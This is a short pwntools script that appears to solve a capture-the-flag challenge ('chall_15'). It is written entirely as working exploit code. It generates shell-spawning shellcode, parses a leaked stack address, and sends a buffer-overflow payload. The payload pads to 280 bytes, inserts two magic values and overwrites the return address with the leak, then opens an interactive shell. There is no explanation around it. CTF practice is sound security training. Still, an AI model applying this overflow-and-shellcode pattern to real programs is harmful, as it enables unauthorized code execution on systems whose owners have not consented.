# coding: utf-8
from pwn import *
context.arch="amd64"
shellcode = asm(shellcraft.sh())
p=process("./chall_15")
p.recvuntil(b"baked beans")
leak = p.recvline()
leak
leak = p.recvline()
leak
ileak = int(leak, 16)
ileak
payload = shellcode + (280 - len(shellcode)) * b"A" + p32(0xdeadd00d) + p32(0xb16b00b5) + b"A"*8 + p64(ileak)
p.sendline(payload)
p.interactive()
